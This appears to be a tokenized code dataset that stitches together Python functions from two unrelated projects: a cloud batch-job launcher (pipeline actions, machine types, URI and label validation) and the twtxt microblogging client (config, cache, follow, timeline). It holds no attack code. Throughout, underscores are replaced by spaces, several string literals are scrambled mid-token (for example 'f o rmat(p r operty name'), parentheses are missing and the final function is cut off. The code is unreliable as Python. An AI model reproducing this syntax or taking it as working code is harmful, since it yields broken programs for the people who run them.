job resources . image , mounts = [ mnt datadisk ] + persistent disk mounts , environment = user environment , entrypoint = '/usr/bin/env' , commands = [ 'bash' , '-c' , USER CMD . format ( tmp dir = providers util . TMP DIR , working dir = providers util . WORKING DIR , user script = script path ) ] ) , google v2 pipelines . build action ( name = 'delocalization' , image uri = CLOUD SDK IMAGE , mounts = [ mnt datadisk ] , environment = delocalization env , entrypoint = '/bin/bash' , commands = [ '-c' , LOCALIZATION CMD . format ( log msg fn = LOG MSG FN , recursive cp fn = GSUTIL RSYNC FN , cp fn = GSUTIL CP FN , cp loop = DELOCALIZATION LOOP ) ] ) , google v2 pipelines . build action ( name = 'final logging' , flags = 'ALWAYS RUN' , image uri = CLOUD SDK IMAGE , environment = logging env , entrypoint = '/bin/bash' , commands = [ '-c' , logging cmd ] ) , ] ) assert len ( actions ) - 2 == user action assert len ( actions ) == final logging action # Prepare the VM (resources) configuration disks = [ google v2 pipelines . build disk ( DATA DISK NAME , job resources . disk size , source image = None , disk type = job resources . disk type or job model . DEFAULT DISK TYPE ) ] disks . extend ( persistent disks ) network = google v2 pipelines . build network ( job resources . network , job resources . subnetwork , job resources . use private address ) if job resources . machine type : machine type = job resources . machine type elif job resources . min cores or job resources . min ram : machine type = Google V2Custom Machine . build machine type ( job resources . min cores , job resources . min ram ) else : machine type = job model . DEFAULT MACHINE TYPE accelerators = None if job resources . accelerator type : accelerators = [ google v2 pipelines . build accelerator ( job resources . accelerator type , job resources . accelerator count ) ] service account = google v2 pipelines . build service account ( job resources . service account or 'default' , scopes ) resources = google v2 pipelines . build resources ( self . project , job resources . regions , google base . get zones ( job resources . zones ) , google v2 pipelines . build machine ( network = network , machine type = machine type , preemptible = job resources . preemptible , service account = service account , boot disk size gb = job resources . boot disk size , disks = disks , accelerators = accelerators , nvidia driver version = job resources . nvidia driver version , labels = labels , cpu platform = job resources . cpu platform ) , ) # Build the pipeline request pipeline = google v2 pipelines . build pipeline ( actions , resources , None , job resources . timeout ) return { 'pipeline' : pipeline , 'labels' : labels }
def validate ram ( ram in mb ) : return int ( Google V2Custom Machine . MEMORY MULTIPLE * math . ceil ( ram in mb / Google V2Custom Machine . MEMORY MULTIPLE ) )
def build machine type ( cls , min cores , min ram ) : min cores = min cores or job model . DEFAULT MIN CORES min ram = min ram or job model . DEFAULT MIN RAM # First, min ram is given in GB. Convert to MB. min ram *= Google V2Custom Machine . MB PER GB # Only machine types with 1 v CPU or an even number of v CP Us can be created. cores = cls . validate cores ( min cores ) # The total memory of the instance must be a multiple of 256 MB. ram = cls . validate ram ( min ram ) # Memory must be between 0.9 GB per v CPU, up to 6.5 GB per v CPU. memory to cpu ratio = ram / cores if memory to cpu ratio < Google V2Custom Machine . MIN MEMORY PER CPU : # If we're under the ratio, top up the memory. adjusted ram = Google V2Custom Machine . MIN MEMORY PER CPU * cores ram = cls . validate ram ( adjusted ram ) elif memory to cpu ratio > Google V2Custom Machine . MAX MEMORY PER CPU : # If we're over the ratio, top up the CPU. adjusted cores = math . ceil ( ram / Google V2Custom Machine . MAX MEMORY PER CPU ) cores = cls . validate cores ( adjusted cores ) else : # Ratio is within the restrictions - no adjustments needed. pass return 'custom-{}-{}' . format ( int ( cores ) , int ( ram ) )
def lookup job tasks ( self , statuses , user ids = None , job ids = None , job names = None , task ids = None , task attempts = None , labels = None , create time min = None , create time max = None , max tasks = 0 ) : statuses = None if statuses == { '*' } else statuses user ids = None if user ids == { '*' } else user ids job ids = None if job ids == { '*' } else job ids job names = None if job names == { '*' } else job names task ids = None if task ids == { '*' } else task ids task attempts = None if task attempts == { '*' } else task attempts if labels or create time min or create time max : raise Not Implemented Error ( 'Lookup by labels and create time not yet supported by stub.' ) operations = [ x for x in self . operations if ( ( not statuses or x . get field ( 'status' , ( None , None ) ) [ 0 ] in statuses ) and ( not user ids or x . get field ( 'user' , None ) in user ids ) and ( not job ids or x . get field ( 'job-id' , None ) in job ids ) and ( not job names or x . get field ( 'job-name' , None ) in job names ) and ( not task ids or x . get field ( 'task-id' , None ) in task ids ) and ( not task attempts or x . get field ( 'task-attempt' , None ) in task attempts ) ) ] if max tasks > 0 : operations = operations [ : max tasks ] return operations
def get provider ( args , resources ) : provider = getattr ( args , 'provider' , 'google' ) if provider == 'google' : return google . Google Job Provider ( getattr ( args , 'verbose' , False ) , getattr ( args , 'dry run' , False ) , args . project ) elif provider == 'google-v2' : return google v2 . Google V2Job Provider ( getattr ( args , 'verbose' , False ) , getattr ( args , 'dry run' , False ) , args . project ) elif provider == 'local' : return local . Local Job Provider ( resources ) elif provider == 'test-fails' : return test fails . Fails Job Provider ( ) else : raise Value Error ( 'Unknown provider: ' + provider )
def create parser ( prog ) : parser = argparse . Argument Parser ( prog = prog , formatter class = Dsub Help Formatter ) parser . add argument ( '--provider' , default = 'google-v2' , choices = [ 'local' , 'google' , 'google-v2' , 'test-fails' ] , help = , metavar = 'PROVIDER' ) return parser
def parse args ( parser , provider required args , argv ) : # Add the provider required arguments epilog message epilog = 'Provider-required arguments:\n' for provider in provider required args : epilog += '  %s: %s\n' % ( provider , provider required args [ provider ] ) parser . epilog = epilog # Parse arguments args = parser . parse args ( argv ) # For the selected provider, check the required arguments for arg in provider required args [ args . provider ] : if not args . getattribute ( arg ) : parser . error ( 'argument --%s is required' % arg ) return args
def get dstat provider args ( provider , project ) : provider name = get provider name ( provider ) args = [ ] if provider name == 'google' : args . append ( '--project %s' % project ) elif provider name == 'google-v2' : args . append ( '--project %s' % project ) elif provider name == 'local' : pass elif provider name == 'test-fails' : pass else : # New providers should add their dstat required arguments here. assert False , 'Provider %s needs get dstat provider args support' % provider args . insert ( 0 , '--provider %s' % provider name ) return ' ' . join ( args )
def format task uri ( fmt , job metadata , task metadata ) : values = { 'job-id' : None , 'task-id' : 'task' , 'job-name' : None , 'user-id' : None , 'task-attempt' : None } for key in values : values [ key ] = task metadata . get ( key ) or job metadata . get ( key ) or values [ key ] return fmt . format ( * * values )
def google v2 parse arguments ( args ) : if ( args . zones and args . regions ) or ( not args . zones and not args . regions ) : raise Value Error ( 'Exactly one of --regions and --zones must be specified' ) if args . machine type and ( args . min cores or args . min ram ) : raise Value Error ( '--machine-type not supported together with --min-cores or --min-ram.' )
def group tasks by jobid ( tasks ) : ret = collections . defaultdict ( list ) for t in tasks : ret [ t . get field ( 'job-id' ) ] . append ( t ) return ret
def validate job and task arguments ( job params , task descriptors ) : if not task descriptors : return task params = task descriptors [ 0 ] . task params # The use case for specifying a label or env/input/output parameter on # the command-line and also including it in the --tasks file is not obvious. # Should the command-line override the --tasks file? Why? # Until this use is articulated, generate an error on overlapping names. # Check labels from jobs = { label . name for label in job params [ 'labels' ] } from tasks = { label . name for label in task params [ 'labels' ] } intersect = from jobs & from tasks if intersect : raise Value Error ( 'Names for labels on the command-line and in the --tasks file must not ' 'be repeated: {}' . format ( ',' . join ( intersect ) ) ) # Check envs, inputs, and outputs, all of which must not overlap each other from jobs = { item . name for item in job params [ 'envs' ] | job params [ 'inputs' ] | job params [ 'outputs' ] } from tasks = { item . name for item in task params [ 'envs' ] | task params [ 'inputs' ] | task params [ 'outputs' ] } intersect = from jobs & from tasks if intersect : raise Value Error ( 'Names for envs, inputs, and outputs on the command-line and in the ' '--tasks file must not be repeated: {}' . format ( ',' . join ( intersect ) ) )
def run ( provider , job resources , job params , task descriptors , name = None , dry run = False , command = None , script = None , user = None , user project = None , wait = False , retries = 0 , poll interval = 10 , after = None , skip = False , project = None , disable warning = False , unique job id = False ) : if not dry run : provider base . emit provider message ( provider ) if not disable warning : raise Value Error ( 'Do not use this unstable API component!' ) if command and script : raise Value Error ( 'Cannot supply both a command and script value.' ) if command : if name : command name = name else : command name = name for command ( command ) # Add the shebang line to ensure the command is treated as Bash script = job model . Script ( command name , '#!/usr/bin/env bash\n' + command ) elif script : # Read the script file script file = dsub util . load file ( script ) script = job model . Script ( os . path . basename ( script ) , script file . read ( ) ) else : raise Value Error ( 'One of --command or a script name must be supplied' ) if retries and not wait : raise Value Error ( 'Requesting retries requires requesting wait' ) # The contract with providers and downstream code is that the job params # and task params contain 'labels', 'envs', 'inputs', and 'outputs'. job model . ensure job params are complete ( job params ) job model . ensure task params are complete ( task descriptors ) task ids = { task descriptor . task metadata . get ( 'task-id' ) for task descriptor in task descriptors if task descriptor . task metadata . get ( 'task-id' ) is not None } # Job and task parameters from the user have been validated. # We can now compute some job and task properties, including: #  job metadata such as the job-id, create-time, user-id, etc. #  task resources such as the logging path (which may include job-id, task-id) job metadata = get job metadata ( provider , user , name , script , task ids , user project , unique job id ) resolve task resources ( job metadata , job resources , task descriptors ) # Job and task properties are now all resolved. Begin execution! if not dry run : print ( 'Job: %s' % job metadata [ 'job-id' ] ) # Wait for predecessor jobs (if any) if after : if dry run : print ( '(Pretend) waiting for: %s.' % after ) else : print ( 'Waiting for predecessor jobs to complete...' ) error messages = wait after ( provider , after , poll interval , True ) if error messages : for msg in error messages : print error ( msg ) raise dsub errors . Predecessor Job Failure Error ( 'One or more predecessor jobs completed but did not succeed.' , error messages , None ) # Launch all the job tasks! job descriptor = job model . Job Descriptor ( job metadata , job params , job resources , task descriptors ) launched job = provider . submit job ( job descriptor , skip ) if not dry run : if launched job [ 'job-id' ] == dsub util . NO JOB : print ( 'Job output already present, skipping new job submission.' ) return { 'job-id' : dsub util . NO JOB } print ( 'Launched job-id: %s' % launched job [ 'job-id' ] ) if launched job . get ( 'task-id' ) : print ( '%s task(s)' % len ( launched job [ 'task-id' ] ) ) print ( 'To check the status, run:' ) print ( "  dstat %s --jobs '%s' --users '%s' --status '*'" % ( provider base . get dstat provider args ( provider , project ) , launched job [ 'job-id' ] , launched job [ 'user-id' ] ) ) print ( 'To cancel the job, run:' ) print ( "  ddel %s --jobs '%s' --users '%s'" % ( provider base . get ddel provider args ( provider , project ) , launched job [ 'job-id' ] , launched job [ 'user-id' ] ) ) # Poll for job completion if wait : print ( 'Waiting for job to complete...' ) if retries : error messages = wait and retry ( provider , job metadata [ 'job-id' ] , poll interval , retries , job descriptor ) else : error messages = wait after ( provider , [ job metadata [ 'job-id' ] ] , poll interval , False ) if error messages : for msg in error messages : print error ( msg ) raise dsub errors . Job Execution Error ( 'One or more jobs finished with status FAILURE or CANCELED' ' during wait.' , error messages , launched job ) return launched job
def get filtered mounts ( mounts , mount param type ) : return set ( [ mount for mount in mounts if isinstance ( mount , mount param type ) ] )
def build logging param ( logging uri , util class = Output File Param Util ) : if not logging uri : return job model . Logging Param ( None , None ) recursive = not logging uri . endswith ( '.log' ) oututil = util class ( '' ) , uri , provider = oututil . parse uri ( logging uri , recursive ) if '*' in uri . basename : raise Value Error ( 'Wildcards not allowed in logging URI: %s' % uri ) return job model . Logging Param ( uri , provider )
def get variable name ( self , name ) : if not name : name = '%s%s' % ( self . auto prefix , self . auto index ) self . auto index += 1 return name
def parse file provider ( uri ) : providers = { 'gs' : job model . P GCS , 'file' : job model . P LOCAL } # URI scheme detector uses a range up to 30 since none of the IANA # registered schemes are longer than this. provider found = re . match ( r'^([A-Za-z][A-Za-z0-9+.-]{0,29})://' , uri ) if provider found : prefix = provider found . group ( 1 ) . lower ( ) else : # If no provider is specified in the URI, assume that the local # filesystem is being used. Availability and validity of the local # file/directory will be checked later. prefix = 'file' if prefix in providers : return providers [ prefix ] else : raise Value Error ( 'File prefix not supported: %s://' % prefix )
def validate paths or fail ( uri , recursive ) : path , filename = os . path . split ( uri ) # dsub could support character ranges ([0-9]) with some more work, but for # now we assume that basic asterisk wildcards are sufficient. Reject any URI # that includes square brackets or question marks, since we know that # if they actually worked, it would be accidental. if '[' in uri or ']' in uri : raise Value Error ( 'Square bracket (character ranges) are not supported: %s' % uri ) if '?' in uri : raise Value Error ( 'Question mark wildcards are not supported: %s' % uri ) # Only support file UR Is and *filename* wildcards # Wildcards at the directory level or "**" syntax would require better # support from the Pipelines API *or* doing expansion here and # (potentially) producing a series of File Params, instead of one. if '*' in path : raise Value Error ( 'Path wildcard (*) are only supported for files: %s' % uri ) if '**' in filename : raise Value Error ( 'Recursive wildcards ("**") not supported: %s' % uri ) if filename in ( '..' , '.' ) : raise Value Error ( 'Path characters ".." and "." not supported ' 'for file names: %s' % uri ) # Do not allow non-recursive IO to reference directories. if not recursive and not filename : raise Value Error ( 'Input or output values that are not recursive must ' 'reference a filename or wildcard: %s' % uri )
def parse uri ( self , raw uri , recursive ) : # Assume recursive UR Is are directory paths. if recursive : raw uri = directory fmt ( raw uri ) # Get the file provider, validate the raw URI, and rewrite the path # component of the URI for docker and remote. file provider = self . parse file provider ( raw uri ) self . validate paths or fail ( raw uri , recursive ) uri , docker uri = self . rewrite uris ( raw uri , file provider ) uri parts = job model . Uri Parts ( directory fmt ( os . path . dirname ( uri ) ) , os . path . basename ( uri ) ) return docker uri , uri parts , file provider
def make param ( self , name , raw uri , recursive ) : if not raw uri : return self . param class ( name , None , None , None , recursive , None ) docker path , uri parts , provider = self . parse uri ( raw uri , recursive ) return self . param class ( name , raw uri , docker path , uri parts , recursive , provider )
def parse image uri ( self , raw uri ) : # The string replace is so we don't have colons and double slashes in the # mount path. The idea is the resulting mount path would look like: # /mnt/data/mount/http/www.googleapis.com/compute/v1/projects/... docker uri = os . path . join ( self . relative path , raw uri . replace ( 'https://' , 'https/' , 1 ) ) return docker uri
def parse local mount uri ( self , raw uri ) : raw uri = directory fmt ( raw uri ) , docker path = local uri rewriter ( raw uri ) local path = docker path [ len ( 'file' ) : ] docker uri = os . path . join ( self . relative path , docker path ) return local path , docker uri
def parse gcs uri ( self , raw uri ) : # Assume URI is a directory path. raw uri = directory fmt ( raw uri ) , docker path = gcs uri rewriter ( raw uri ) docker uri = os . path . join ( self . relative path , docker path ) return docker uri
def make param ( self , name , raw uri , disk size ) : if raw uri . startswith ( 'https://www.googleapis.com/compute' ) : # Full Image URI should look something like: # https://www.googleapis.com/compute/v1/projects/<project>/global/images/ # But don't validate further, should the form of a valid image URI # change (v1->v2, for example) docker path = self . parse image uri ( raw uri ) return job model . Persistent Disk Mount Param ( name , raw uri , docker path , disk size , disk type = None ) elif raw uri . startswith ( 'file://' ) : local path , docker path = self . parse local mount uri ( raw uri ) return job model . Local Mount Param ( name , raw uri , docker path , local path ) elif raw uri . startswith ( 'gs://' ) : docker path = self . parse gcs uri ( raw uri ) return job model . GCS Mount Param ( name , raw uri , docker path ) else : raise Value Error ( 'Mount parameter {} must begin with valid prefix.' . format ( raw uri ) )
def validate param name ( name , param type ) : # http://pubs.opengroup.org/onlinepubs/9699919799/basedefs/V1 chap03.html#tag 03 235 # # 3.235 Name # In the shell command language, a word consisting solely of underscores, # digits, and alphabetics from the portable character set. if not re . match ( r'^[a-z A-Z ][a-z A-Z0-9 ]*$' , name ) : raise Value Error ( 'Invalid %s: %s' % ( param type , name ) )
def validate bucket name ( bucket ) : if not bucket . startswith ( 'gs://' ) : raise Value Error ( 'Invalid bucket path "%s". Must start with "gs://".' % bucket ) bucket name = bucket [ len ( 'gs://' ) : ] if not re . search ( r'^\w[\w \.-]{1,61}\w$' , bucket name ) : raise Value Error ( 'Invalid bucket name: %s' % bucket )
def convert to label chars ( s ) : # We want the results to be user-friendly, not just functional. # So we can't base-64 encode it. #   * If upper-case: lower-case it #   * If the char is not a standard letter or digit. make it a dash # March 2019 note: underscores are now allowed in labels. # However, removing the conversion of underscores to dashes here would # create inconsistencies between old jobs and new jobs. # With existing code, $USER "jane doe" has a user-id label of "jane-doe". # If we remove the conversion, the user-id label for new jobs is "jane doe". # This makes looking up old jobs more complicated. accepted characters = string . ascii lowercase + string . digits + '-' def label char transform ( char ) : if char in accepted characters : return char if char in string . ascii uppercase : return char . lower ( ) return '-' return '' . join ( label char transform ( c ) for c in s )
def ensure task params are complete ( task descriptors ) : for task desc in task descriptors : for param in [ 'labels' , 'envs' , 'inputs' , 'outputs' , 'input-recursives' , 'output-recursives' ] : if not task desc . task params . get ( param ) : task desc . task params [ param ] = set ( )
def validate label ( cls , name , value ) : # Rules for labels are described in: #  https://cloud.google.com/compute/docs/labeling-resources#restrictions # * Keys and values cannot be longer than 63 characters each. # * Keys and values can only contain lowercase letters, numeric characters, #   underscores, and dashes. # * International characters are allowed. # * Label keys must start with a lowercase letter and international #   characters are allowed. # * Label keys cannot be empty. cls . check label name ( name ) cls . check label value ( value ) # Ensure that reserved labels are not being used. if not cls . allow reserved keys and name in RESERVED LABELS : raise Value Error ( 'Label flag (%s=...) must not use reserved keys: %r' % ( name , list ( RESERVED LABELS ) ) )
def from yaml ( cls , yaml string ) : try : job = yaml . full load ( yaml string ) except Attribute Error : # For installations that cannot update their Py YAML version job = yaml . load ( yaml string ) # If the YAML does not contain a top-level dsub version, then assume that # the string is coming from the local provider, reading an old version of # its meta.yaml. dsub version = job . get ( 'dsub-version' ) if not dsub version : return cls . from yaml v0 ( job ) job metadata = { } for key in [ 'job-id' , 'job-name' , 'task-ids' , 'user-id' , 'dsub-version' , 'user-project' , 'script-name' ] : if job . get ( key ) is not None : job metadata [ key ] = job . get ( key ) # Make sure that create-time string is turned into a datetime job metadata [ 'create-time' ] = dsub util . replace timezone ( job . get ( 'create-time' ) , pytz . utc ) job resources = Resources ( logging = job . get ( 'logging' ) ) job params = { } job params [ 'labels' ] = cls . label params from dict ( job . get ( 'labels' , { } ) ) job params [ 'envs' ] = cls . env params from dict ( job . get ( 'envs' , { } ) ) job params [ 'inputs' ] = cls . input file params from dict ( job . get ( 'inputs' , { } ) , False ) job params [ 'input-recursives' ] = cls . input file params from dict ( job . get ( 'input-recursives' , { } ) , True ) job params [ 'outputs' ] = cls . output file params from dict ( job . get ( 'outputs' , { } ) , False ) job params [ 'output-recursives' ] = cls . output file params from dict ( job . get ( 'output-recursives' , { } ) , True ) job params [ 'mounts' ] = cls . mount params from dict ( job . get ( 'mounts' , { } ) ) task descriptors = [ ] for task in job . get ( 'tasks' , [ ] ) : task metadata = { 'task-id' : task . get ( 'task-id' ) } # Old instances of the meta.yaml do not have a task create time. create time = task . get ( 'create-time' ) if create time : task metadata [ 'create-time' ] = dsub util . replace timezone ( create time , pytz . utc ) if task . get ( 'task-attempt' ) is not None : task metadata [ 'task-attempt' ] = task . get ( 'task-attempt' ) task params = { } task params [ 'labels' ] = cls . label params from dict ( task . get ( 'labels' , { } ) ) task params [ 'envs' ] = cls . env params from dict ( task . get ( 'envs' , { } ) ) task params [ 'inputs' ] = cls . input file params from dict ( task . get ( 'inputs' , { } ) , False ) task params [ 'input-recursives' ] = cls . input file params from dict ( task . get ( 'input-recursives' , { } ) , True ) task params [ 'outputs' ] = cls . output file params from dict ( task . get ( 'outputs' , { } ) , False ) task params [ 'output-recursives' ] = cls . output file params from dict ( task . get ( 'output-recursives' , { } ) , True ) task resources = Resources ( logging path = task . get ( 'logging-path' ) ) task descriptors . append ( Task Descriptor ( task metadata , task params , task resources ) ) return Job Descriptor ( job metadata , job params , job resources , task descriptors )
def find task descriptor ( self , task id ) : # It is not guaranteed that the index will be task id - 1 when --tasks is # used with a min/max range. for task descriptor in self . task descriptors : if task descriptor . task metadata . get ( 'task-id' ) == task id : return task descriptor return None
def get file environment variables ( file params ) : env = { } for param in file params : # We have no cases where the environment variable provided to user # scripts have a trailing slash, so be sure to always strip it. # The case that this is specifically handling is --input-recursive and # --output-recursive variables, which are directory values. env [ param . name ] = os . path . join ( DATA MOUNT POINT , param . docker path . rstrip ( '/' ) ) if param . value else '' return env
def get job and task param ( job params , task params , field ) : return job params . get ( field , set ( ) ) | task params . get ( field , set ( ) )
def emit search criteria ( user ids , job ids , task ids , labels ) : print ( 'Delete running jobs:' ) print ( '  user:' ) print ( '    %s\n' % user ids ) print ( '  job-id:' ) print ( '    %s\n' % job ids ) if task ids : print ( '  task-id:' ) print ( '    %s\n' % task ids ) # Labels are in a Label Param namedtuple and must be reformated for printing. if labels : print ( '  labels:' ) print ( '    %s\n' % repr ( labels ) )
def get action by id ( op , action id ) : actions = get actions ( op ) if actions and 1 <= action id < len ( actions ) : return actions [ action id - 1 ]
def get action by name ( op , name ) : actions = get actions ( op ) for action in actions : if action . get ( 'name' ) == name : return action
def get action environment ( op , name ) : action = get action by name ( op , name ) if action : return action . get ( 'environment' )
def get action image ( op , name ) : action = get action by name ( op , name ) if action : return action . get ( 'image Uri' )
def get event of type ( op , event type ) : events = get events ( op ) if not events : return None return [ e for e in events if e . get ( 'details' , { } ) . get ( '@type' ) == event type ]
def get last update ( op ) : last update = get end time ( op ) if not last update : last event = get last event ( op ) if last event : last update = last event [ 'timestamp' ] if not last update : last update = get create time ( op ) return last update
def prepare output ( self , row ) : date fields = [ 'last-update' , 'create-time' , 'start-time' , 'end-time' ] int fields = [ 'task-attempt' ] for col in date fields : if col in row : row [ col ] = self . default format date ( row [ col ] ) for col in int fields : if col in row and row [ col ] is not None : row [ col ] = int ( row [ col ] ) return row
def trim display field ( self , value , max length ) : if not value : return '' if len ( value ) > max length : return value [ : max length - 3 ] + '...' return value
def format pairs ( self , values ) : return ', ' . join ( '%s=%s' % ( key , value ) for key , value in sorted ( values . items ( ) ) )
def string presenter ( self , dumper , data ) : if '\n' in data : return dumper . represent scalar ( 'tag:yaml.org,2002:str' , data , style = '|' ) else : return dumper . represent scalar ( 'tag:yaml.org,2002:str' , data )
def prepare job metadata ( script , job name , user id , create time ) : # The name of the pipeline gets set into the ephemeral Pipeline.name as-is. # The default name of the pipeline is the script name # The name of the job is derived from the job name and gets set as a # 'job-name' label (and so the value must be normalized). if job name : pipeline name = job name job name value = job model . convert to label chars ( job name ) else : pipeline name = os . path . basename ( script ) job name value = job model . convert to label chars ( pipeline name . split ( '.' , 1 ) [ 0 ] ) # The user-id will get set as a label user id = job model . convert to label chars ( user id ) # Now build the job-id. We want the job-id to be expressive while also # having a low-likelihood of collisions. # # For expressiveness, we: # * use the job name (truncated at 10 characters). # * insert the user-id # * add a datetime value # To have a high likelihood of uniqueness, the datetime value is out to # hundredths of a second. # # The full job-id is: #   <job-name>--<user-id>--<timestamp> job id = '%s--%s--%s' % ( job name value [ : 10 ] , user id , create time . strftime ( '%y%m%d-%H%M%S-%f' ) [ : 16 ] ) # Standard version is MAJOR.MINOR(.PATCH). This will convert the version # string to "v MAJOR-MINOR(-PATCH)". Example; "0.1.0" -> "v0-1-0". version = job model . convert to label chars ( 'v%s' % DSUB VERSION ) return { 'pipeline-name' : pipeline name , 'job-name' : job name value , 'job-id' : job id , 'user-id' : user id , 'dsub-version' : version , }
def get operation full job id ( op ) : job id = op . get field ( 'job-id' ) task id = op . get field ( 'task-id' ) if task id : return '%s.%s' % ( job id , task id ) else : return job id
def send payload ( self , params ) : data = json . dumps ( { 'jsonrpc' : self . version , 'method' : self . service name , 'params' : params , 'id' : text type ( uuid . uuid4 ( ) ) } ) data binary = data . encode ( 'utf-8' ) url request = Request ( self . service url , data binary , headers = self . headers ) return urlopen ( url request ) . read ( )
def json rpc format ( self ) : error = { 'name' : text type ( self . class . name ) , 'code' : self . code , 'message' : '{0}' . format ( text type ( self . message ) ) , 'data' : self . data } if current app . config [ 'DEBUG' ] : import sys , traceback error [ 'stack' ] = traceback . format exc ( ) error [ 'executable' ] = sys . executable return error
def discover ( cls ) : file = os . path . join ( Config . config dir , Config . config name ) return cls . from file ( file )
def write config ( self ) : with open ( self . config file , "w" ) as config file : self . cfg . write ( config file )
def check config sanity ( self ) : is sane = True # This extracts some properties which cannot be checked like "nick", # but it is definitely better than writing the property names as a # string literal. properties = [ property name for property name , obj in self . class . dict . items ( ) if isinstance ( obj , property ) ] for property name in properties : try : getattr ( self , property name ) except Value Error as e : click . echo ( " Config error on {0} - {1}".f o rmat(p r operty name,  e ) is sane = False return is sane
def validate config key ( ctx , param , value ) : if not value : return value try : section , item = value . split ( "." , 1 ) except Value Error : raise click . Bad Argument Usage ( "Given key does not contain a section name." ) else : return section , item
def make aware ( dt ) : return dt if dt . tzinfo else dt . replace ( tzinfo = timezone . utc )
def from file ( cls , file , * args , * * kwargs ) : try : cache = shelve . open ( file ) return cls ( file , cache , * args , * * kwargs ) except OS Error as e : logger . debug ( "Loading {0} failed" . format ( file ) ) raise e
def discover ( cls , * args , * * kwargs ) : file = os . path . join ( Cache . cache dir , Cache . cache name ) return cls . from file ( file , * args , * * kwargs )
def is cached ( self , url ) : try : return True if url in self . cache else False except Type Error : return False
def add tweets ( self , url , last modified , tweets ) : try : self . cache [ url ] = { "last modified" : last modified , "tweets" : tweets } self . mark updated ( ) return True except Type Error : return False
def get tweets ( self , url , limit = None ) : try : tweets = self . cache [ url ] [ "tweets" ] self . mark updated ( ) return sorted ( tweets , reverse = True ) [ : limit ] except Key Error : return [ ]
def remove tweets ( self , url ) : try : del self . cache [ url ] self . mark updated ( ) return True except Key Error : return False
def cli ( ctx , config , verbose ) : init logging ( debug = verbose ) if ctx . invoked subcommand == "quickstart" : return # Skip initializing config file try : if config : conf = Config . from file ( config ) else : conf = Config . discover ( ) except Value Error as e : if "Error in config file." in str ( e ) : click . echo ( " Please correct the errors mentioned above an run twtxt again.") else : click . echo ( " Config file not found or not readable. You may want to run twtxt quickstart.") sys . exit ( ) ctx . default map = conf . build default map ( ) ctx . obj = { 'conf' : conf }
def tweet ( ctx , created at , twtfile , text ) : text = expand mentions ( text ) tweet = Tweet ( text , created at ) if created at else Tweet ( text ) pre tweet hook = ctx . obj [ "conf" ] . pre tweet hook if pre tweet hook : run pre tweet hook ( pre tweet hook , ctx . obj [ "conf" ] . options ) if not add local tweet ( tweet , twtfile ) : click . echo ( " Couldnt write to file.") else : post tweet hook = ctx . obj [ "conf" ] . post tweet hook if post tweet hook : run post tweet hook ( post tweet hook , ctx . obj [ "conf" ] . options )
def timeline ( ctx , pager , limit , twtfile , sorting , timeout , porcelain , source , cache , force update ) : if source : source obj = ctx . obj [ "conf" ] . get source by nick ( source ) if not source obj : logger . debug ( "Not following {0}, trying as URL" . format ( source ) ) source obj = Source ( source , source ) sources = [ source obj ] else : sources = ctx . obj [ "conf" ] . following tweets = [ ] if cache : try : with Cache . discover ( update interval = ctx . obj [ "conf" ] . timeline update interval ) as cache : force update = force update or not cache . is valid if force update : tweets = get remote tweets ( sources , limit , timeout , cache ) else : logger . debug ( "Multiple calls to 'timeline' within {0} seconds. Skipping update" . format ( cache . update interval ) ) # Behold, almighty list comprehensions! (I might have gone overboard here) tweets = list ( chain . from iterable ( [ cache . get tweets ( source . url ) for source in sources ] ) ) except OS Error as e : logger . debug ( e ) tweets = get remote tweets ( sources , limit , timeout ) else : tweets = get remote tweets ( sources , limit , timeout ) if twtfile and not source : source = Source ( ctx . obj [ "conf" ] . nick , ctx . obj [ "conf" ] . twturl , file = twtfile ) tweets . extend ( get local tweets ( source , limit ) ) if not tweets : return tweets = sort and truncate tweets ( tweets , sorting , limit ) if pager : click . echo via pager ( style timeline ( tweets , porcelain ) ) else : click . echo ( style timeline ( tweets , porcelain ) )
def follow ( ctx , nick , url , force ) : source = Source ( nick , url ) sources = ctx . obj [ 'conf' ] . following if not force : if source . nick in ( source . nick for source in sources ) : click . confirm ( " Youre already following {0}. Overwrite?".for m at( click . style ( source . nick , bold = True ) ) , default = False , abort = True ) , status = get remote status ( [ source ] ) [ 0 ] if not status or status . status code != 200 : click . confirm ( " The feed of {0} at {1} is not available. Follow anyway?".f o rmat( click . style ( source . nick , bold = True ) , click . style ( source . url , bold = True ) ) , default = False , abort = True ) ctx . obj [ 'conf' ] . add source ( source ) click . echo ( " Youre now following {0}.".for m at( click . style ( source . nick , bold = True ) ) )
def unfollow ( ctx , nick ) : source = ctx . obj [ 'conf' ] . get source by nick ( nick ) try : with Cache . discover ( ) as cache : cache . remove tweets ( source . url ) except OS Error as e : logger . debug ( e ) ret val = ctx . obj [ 'conf' ] . remove source by nick ( nick ) if ret val : click . echo ( " Youve unfollowed {0}.".for m at( click . style ( source . nick , bold = True ) ) ) else : click . echo ( " Youre not following {0}.".for m at( click . style ( nick , bold = True ) ) )
def quickstart ( ) : width = click . get terminal size ( ) [ 0 ] width = width if width <= 79 else 79 click . secho ( "twtxt - quickstart" , fg = "cyan" ) click . secho ( "==================" , fg = "cyan" ) click . echo ( ) help text = "This wizard will generate a basic configuration file for twtxt with all mandatory options set. " "You can change all of these later with either twtxt itself or by editing the config file manually. " "Have a look at the docs to get information about the other available options and their meaning." click . echo ( textwrap . fill ( help text , width ) ) click . echo ( ) nick = click . prompt ( " Please enter your desired nick",  d fault=o s .e n viron.g e t(" U SER",  " )) def overwrite check ( path ) : if os . path . isfile ( path ) : click . confirm ( " '{0}' already exists. Overwrite?".f o rmat(p a th),   a ort=T r ue) cfgfile = click . prompt ( " Please enter the desired location for your config file", os . path . join ( Config . config dir , Config . config name ) , type = click . Path ( readable = True , writable = True , file okay = True ) ) cfgfile = os . path . expanduser ( cfgfile ) overwrite check ( cfgfile ) twtfile = click . prompt ( " Please enter the desired location for your twtxt file", os . path . expanduser ( "~/twtxt.txt" ) , type = click . Path ( readable = True , writable = True , file okay = True ) ) twtfile = os . path . expanduser ( twtfile ) overwrite check ( twtfile ) twturl = click . prompt ( " Please enter the URL your twtxt file will be accessible from", default = "https://example.org/twtxt.txt" ) disclose identity = click . confirm ( " Do you want to disclose your identity? Your nick and URL will be shared when " "making HTTP requests" , default = False ) click . echo ( ) add news = click . confirm ( " Do you want to follow the twtxt news feed?",  d fault=T r ue) conf = Config . create config ( cfgfile , nick , twtfile , twturl , disclose identity , add news ) twtfile dir = os . path . dirname ( twtfile ) if not os . path . exists ( twtfile dir ) : os . makedirs ( twtfile dir ) open ( twtfile , "a" ) . close ( ) click . echo ( ) click . echo ( " Created config file at '{0}'.".f o rmat(c l ick.f o rmat filename(c o nf.c o nfig file)) ) click . echo ( " Created twtxt file at '{0}'.".f o rmat(c l 